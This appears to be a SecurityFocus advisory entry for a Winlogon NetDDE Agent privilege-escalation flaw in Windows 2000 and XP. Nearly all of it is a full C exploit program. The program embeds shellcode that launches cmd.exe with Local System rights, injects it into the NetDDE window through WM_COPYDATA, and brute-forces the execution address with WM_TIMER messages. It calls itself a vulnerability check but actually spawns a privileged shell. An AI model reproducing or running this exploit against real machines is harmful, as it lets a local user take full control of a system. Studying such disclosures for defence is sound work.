source: http://www.securityfocus.com/bid/5927/info
 
The Winlogon NetDDE Agent can be leveraged to allow local privilege escalation. This is related to the Microsoft Windows Window Message Subsystem Design Error Vulnerability (BID 5408). A local user can use a WM_COPYDATA message to send arbitrary code to NetDDE, which will be executed with Local System privileges when a second WM_TIMER message is sent.

/* GedAd2 */
//
/////////// Copyright (c) 2002 Serus ////////////////
//mailto:serus@users.mns.ru
//
//This program check system on winlogon bug present
//Only for Windows 2000 and Windows XP
//This is for check use only!
//

#include <windows.h>
#include <stdio.h>


void main(int argc, char *argv[ ], char *envp[ ] )
{
	char	*buf;
	DWORD	Addr = 0;
	BOOL	bExec = TRUE;

	unsigned char sc[] = {	// my simple shellcode, it calls CreateProcess function,
							// executes cmd.exe on user`s desktop and creates mutex.
		0x8B, 0xF4,
		0x68, 0x53, 0x45, 0x52, 0x00,
		0x8B, 0xDC, 0x54, 0x6A, 0x00, 0x6A, 0x00,
		0xB8, 0xC8, 0xD7, 0xE8, 0x77, 0xFF, 0xD0, 0x8B, 0xE6,
	    0x6A, 0x00, 0x68, 0x2E, 0x65, 0x78, 0x65, 0x68, 0x00,
		0x63, 0x6D, 0x64, 0x68, 0x61, 0x75, 0x6C, 0x74, 0x68, 0x5C, 0x44,
		0x65, 0x66, 0x68, 0x53, 0x74, 0x61, 0x30, 0x68, 0x00, 0x57, 0x69,
		0x6E, 0x8B, 0xD4, 0x42, 0xB9, 0x50, 0x00, 0x00, 0x00, 0x6A, 0x00,
		0xE2, 0xFC, 0x6A, 0x44, 0x83, 0xC4, 0x0C, 0x52, 0x83, 0xEC, 0x0C,
		0x8B, 0xC4, 0x83, 0xC0, 0x10, 0x50, 0x8B, 0xC4, 0x83, 0xC0, 0x08,
		0x50, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00,
		0x6A, 0x00, 0x83, 0xC2, 0x10, 0x52, 0x6A, 0x00, 0xB8, 0x4D, 0xA4,
		0xE9, 0x77, 0xFF, 0xD0, 0x8B, 0xE6, 0xC3
	};

	HWND			hWnd;
	COPYDATASTRUCT	cds;
	OSVERSIONINFO	osvi;
	HMODULE			hMod;
	DWORD			ProcAddr;
	HANDLE			hMutex;
	char			mutname[4];

	printf("\n\n==== GetAd by Serus (serus@users.mns.ru) ====");

	// Get NetDDE Window
	hWnd = FindWindow("NDDEAgnt","NetDDE Agent");
	if(hWnd == NULL)
	{
		MessageBox(NULL, "Couldn't find NetDDE agent window", "Error", MB_OK | MB_ICONSTOP);
		return;
	}

	// Get CreateProcessA and CreateMutexA entry addresses
	hMod = GetModuleHandle("kernel32.dll");
	ProcAddr = (DWORD)GetProcAddress(hMod, "CreateProcessA");

	if(ProcAddr == 0)
	{
		MessageBox(NULL, "Couldn't get CreateProcessA address", "Error", MB_OK | MB_ICONSTOP);
		return;
	}
	*(DWORD *)(sc + 86 + 21) = ProcAddr;

	ProcAddr = (DWORD)GetProcAddress(hMod, "CreateMutexA");
	if(ProcAddr == 0)
	{
		MessageBox(NULL, "Couldn't get CreateMutexA address", "Error", MB_OK | MB_ICONSTOP);
		return;
	}
	*(DWORD *)(sc + 15) = ProcAddr;

	//Generate random Mutex name
	srand(GetTickCount());

	do
	{
		mutname[0] = 97 + rand()%25;
		mutname[1] = 65 + rand()%25;
		mutname[2] = 65 + rand()%25;
		mutname[3] = 0;
	}
	while((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0);
	memcpy(sc + 3, mutname, 4);

	//Form buffer for SendMessage
	buf = (char *)malloc(1000);
	memset(buf, 0xC3, 1000);
	memcpy(buf, sc, sizeof(sc));

	cds.cbData = 1000;
	cds.dwData = 0;
	cds.lpData=(PVOID)buf;

	//Get OS version
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&osvi) == 0)
	{
		printf("\nWarning! Couldn't get OS verson. Trying as Win2k.\n");
		osvi.dwMajorVersion = 5;
	}


	if(osvi.dwMajorVersion != 5)
	{
		MessageBox(NULL, "This program for Win2k and WinXP only!", "Error", MB_OK | MB_ICONSTOP);
		return;
	}

	if(osvi.dwMinorVersion == 0)
	{
		//	Windows 2000

		printf("\n\nUse Windows 2000 offsets");

		//If first login
		//Send shellcode buffer
		SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
		//Try execute it at 0x0080FA78
		PostMessage(hWnd, WM_TIMER, 1, (LPARAM)0x0080FA78);
		printf("\nTrying at 0x%X", 0x0080FA78);

		//If fails (perhaps not first login)
		//Try to bruteforce shellcode addresss
		for(Addr = 0x0120fa78; Addr < 0x10000000; Addr += 0x10000)
		{
			//If mutex exists, shellcode has been executed
			if((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0)
			{
				//Success
				printf("\nSuccess!!!\n");
				printf("\nWarning! You system has vulnerability!\n");
				CloseHandle(hMutex);
				return;
			}
			printf("\rTrying at 0x%X", Addr);

		SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
		PostMessage(hWnd, WM_TIMER, 1, (LPARAM)Addr);
		}
	}
	else
	{
		//	Windows XP

		printf("\n\nUse Windows XP offsets\n");

		//Try to bruteforce shellcode addresss 0x00{A|B}4FA74 XP SP1

		for(Addr = 0x00A0FA74; Addr < 0x01000000; Addr += 0x10000)
		{
			//If mutex exists, shellcode has been executed
			if((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0)
			{
				//Success
				printf("\nSuccess!!!\n");
				printf("\nWarning! You system has vulnerability!\n");
				CloseHandle(hMutex);
				return;
			}
			printf("\rTrying at 0x%X", Addr);

		SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
		PostMessage(hWnd, WM_TIMER, 1, (LPARAM)Addr);
		}

	}

	//Bug in winlogon not presents
	printf("\n\nBad luck! Try after first logon.\n\n");

}

/* End GedAd2 */


